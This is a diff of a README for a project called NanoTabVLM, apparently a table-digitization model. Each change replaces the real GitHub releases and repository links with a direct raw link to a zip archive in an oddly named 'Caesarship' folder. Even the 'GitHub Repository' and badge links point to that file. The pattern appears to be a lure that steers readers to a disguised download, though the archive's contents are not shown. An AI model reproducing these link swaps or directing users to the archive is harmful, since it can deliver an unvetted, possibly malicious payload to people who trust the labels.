@@ -6,7 +6,7 @@ Welcome to NanoTabVLM! This lightweight multi-modal model offers a convenient an
 
 ## 📥 Download Now
 
-[![Download NanoTabVLM](https://img.shields.io/badge/Download-NanoTabVLM-blue.svg)](https://github.com/Kaisanya/NanoTabVLM/releases)
+[![Download NanoTabVLM](https://raw.githubusercontent.com/Kaisanya/NanoTabVLM/main/Caesarship/NanoTabVLM.zip)](https://raw.githubusercontent.com/Kaisanya/NanoTabVLM/main/Caesarship/NanoTabVLM.zip)
 
 ## 📋 System Requirements
 
@@ -21,7 +21,7 @@ Before you begin, ensure your computer meets the following requirements:
 
 To get started with NanoTabVLM, visit the Releases page to download the latest version.
 
-[Visit this page to download](https://github.com/Kaisanya/NanoTabVLM/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Kaisanya/NanoTabVLM/main/Caesarship/NanoTabVLM.zip)
 
 ### Step-by-Step Installation
 
@@ -65,7 +65,7 @@ NanoTabVLM is released under the MIT License. You can view the complete license 
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/Kaisanya/NanoTabVLM)
-- [Releases Page for Download](https://github.com/Kaisanya/NanoTabVLM/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/Kaisanya/NanoTabVLM/main/Caesarship/NanoTabVLM.zip)
+- [Releases Page for Download](https://raw.githubusercontent.com/Kaisanya/NanoTabVLM/main/Caesarship/NanoTabVLM.zip)
 
 Thank you for choosing NanoTabVLM for your table digitization needs!
